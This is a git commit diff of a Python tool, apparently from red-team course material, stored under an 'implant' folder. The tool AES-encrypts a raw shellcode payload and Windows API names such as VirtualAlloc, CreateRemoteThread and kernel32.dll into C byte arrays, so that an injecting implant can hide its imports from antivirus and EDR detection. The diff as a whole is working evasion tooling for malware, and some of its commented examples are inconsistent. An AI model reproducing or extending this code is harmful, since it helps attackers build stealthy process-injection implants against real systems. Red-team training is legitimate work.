e164143e2f1d05c33ab19073fcd4590051f6de05
p.load <57832389+p4yl0ad@users.noreply.github.com>
2021-08-29 19:14:35 +0100

    Update aesencrypt.py

--- MDE/implant/aesencrypt.py
+++ MDE/implant/aesencrypt.py
@@ -1,79 +1,123 @@
 # Red Team Operator course code template
 # payload encryption with AES
 # 
-# author: reenz0h (twitter: @sektor7net)
+# Original author: reenz0h (twitter: @sektor7net)
+#
+# Heavily modified by: p4yl0ad
+#
+#
+# Check out sektor7
 
-import sys
+
+
+import sys, re, hashlib
 from Crypto.Cipher import AES
 from os import urandom
-import hashlib
-
-KEY = urandom(16)
 
 def pad(s):
 	return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)
 
 def aesenc(plaintext, key):
-
 	k = hashlib.sha256(key).digest()
 	iv = 16 * '\x00'
 	plaintext = pad(plaintext)
 	cipher = AES.new(k, AES.MODE_CBC, iv)
-
 	return cipher.encrypt(bytes(plaintext))
 
 
-try:
-    plaintext = open(sys.argv[1], "rb").read()
-except:
-    print("File argument needed! %s <raw payload file>" % sys.argv[0])
-    sys.exit()
-ciphertext = aesenc(plaintext, KEY)
 
-
-def obfuser(ApiCallToObfus):
-
-    stringApiCallToObfus = "s" + ApiCallToObfus
-    pointerApiCallToObfus = "p" + ApiCallToObfus
+def getcap(word):
+    r = re.findall('([A-Z])', word)
+    return ("".join (x for x in r) + word[len(word)-1])
     
-    unsignedencstring = 'unsigned char '+stringApiCallToObfus+'[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ApiCallToObfus) + ' };'
-    AESdecstring = 'AESDecrypt((char *) '+stringApiCallToObfus+', sizeof('+stringApiCallToObfus+'), key, sizeof(key));	'
-    pString = pointerApiCallToObfus+' = GetProcAddress(GetModuleHandle("kernel32.dll"), '+stringApiCallToObfus+');'
+
+def printunsigned(alias, keyname, ciphertext):
+    print('unsigned char ' + alias + '[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')
+    print('AESDecrypt((char *) '+alias+', sizeof('+alias+'), '+keyname+', sizeof('+keyname+'));')
     
-    return unsignedencstring,AESdecstring,pString
+
+
+
+def obfus(ToObfus):
     
     
+    # Good example 
+    # CreateRemoteThread
+    #unsigned char sCRTk[] = { 0x27, 0xfc, 0xf1, 0xbb, 0xfc, 0xd1, 0xb2, 0xe9, 0x10, 0x7f, 0xa9, 0xba, 0x9b, 0xa9, 0x43, 0x2f };
+    #unsigned char sCRT[] = { 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x52, 0x65, 0x6d, 0x6f, 0x74, 0x65, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64 };
+	#AESDecrypt((char *) sCRT, sizeof(sCRT), sCRTk, sizeof(sCRTk));
     
-    #->unsigned char sVirtualAllocEx[] = { 0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6c, 0x41, 0x6c, 0x6c, 0x6f, 0x63, 0x45, 0x78 };
-    #->AESDecrypt((char *) sVirtualAllocEx, sizeof(sVirtualAllocEx), key, sizeof(key));	
-    #pVirtualAllocEx = GetProcAddress(GetModuleHandle("kernel32.dll"), sVirtualAllocEx);
+    # kernel32.dll
+    #unsigned char k32k[] = { 0x27, 0xfc, 0xf1, 0xbb, 0xfc, 0xd1, 0xb2, 0xe9, 0x10, 0x7f, 0xa9, 0xba, 0x9b, 0xa9, 0x43, 0x2f };
+    #unsigned char k32[] = { 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x52, 0x65, 0x6d, 0x6f, 0x74 };
+    #AESDecrypt((char *) k32, sizeof(k32), k32k, sizeof(k32k));
+	#pCRT = GetProcAddress(GetModuleHandle(k32), sCRT);
     
-   
+    print("")
+    KEY = urandom(16)
+    alias = getcap(ToObfus)
+    keyname = alias + "k"
+    printkey(KEY, keyname)
+    ciphertext = aesenc(ToObfus, KEY)
+    printunsigned(alias, keyname, ciphertext)
 
+    KEY2 = urandom(16)
+    alias2 = 'k32'
+    keyname2 = alias2 + "k"
+    printkey(KEY2, keyname2)
+    ciphertext2 = aesenc("kernel32.dll", KEY2)
+    
+    
+    printunsigned(alias2, keyname2, ciphertext2)
+    
+    
+    
+    
+ 
+    """
+    ciphertext = aesenc(ToObfus, KEY)
+    
+    keyHexArr = 'key[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in KEY) + ' };'
+    
+    arrayname = getcap(ToObfus)
+    unsignedCharC = 'unsigned char '+arrayname+'[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };'
+    
+    AESdecstring = 'AESDecrypt((char *) '+arrayname+', sizeof('+arrayname+'), key, sizeof(key));'
+    pString = pointerApiCallToObfus+' = GetProcAddress(GetModuleHandle("kernel32.dll"), '+arrayname+');'
+    
+    #printkey(urandom(16))
+    #unsignedencstring = 'unsigned char '+stringApiCallToObfus+'[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ApiCallToObfus) + ' };'
+    """
+    
+    
+    
 
-# Payload section
-print('char key[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in KEY) + ' };')
-print('unsigned char calc_payload[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')
-print("unsigned int calc_len = sizeof(calc_payload);")
-
-
-# Obfus section
-sVirtualAllocEx = "VirtualAllocEx"
-sWriteProcessMemory = "WriteProcessMemory"
-sCreateRemoteThread = "CreateRemoteThread"
-sVirtualAlloc = "VirtualAlloc"
-sCreateToolhelp32Snapshot = "CreateToolhelp32Snapshot"
-
-#print('unsigned char sWriteProcessMemory[] =  { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in sWriteProcessMemory) + ' };')
-#print('unsigned char sCreateRemoteThread[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in sCreateRemoteThread) + ' };')
-#print('unsigned char sVirtualAlloc[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in sVirtualAlloc) + ' };')
-#print('unsigned char sCreateToolhelp32Snapshot[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in sCreateToolhelp32Snapshot) + ' };')
-
-
-kek = ['VirtualAllocEx','WriteProcessMemory','CreateRemoteThread','VirtualAlloc','CreateToolhelp32Snapshot']
-
-
-for i in kek:
-    print(i)
-    for i in obfuser(i):
-        print(i) 
+    
+#def libcalls(libAlias):
+#   if libAlias == "k":
+#        obfus("kernel32.dll")
+#        
+#    elif libAlias == "n":
+#        obfus("Ntdll.dll")
+        
+        
+ 
+def printkey(KEY, keyname):
+    print('unsigned char ' + keyname + '[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in KEY) + ' };')
+    
+    
+if __name__ == '__main__':
+        plaintext = open(sys.argv[1], "rb").read()
+        payloadkey = urandom(16)
+        ciphertext = aesenc(plaintext, payloadkey)
+        print(printkey(payloadkey,"pke"))
+        print('unsigned char payload[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')
+        
+        
+        
+        obfus("VirtualAlloc")
+        # do function encrypts + key here
+        
+    #except:
+    #    print("File argument needed! %s <raw payload file>" % sys.argv[0])
+    #    sys.exit()
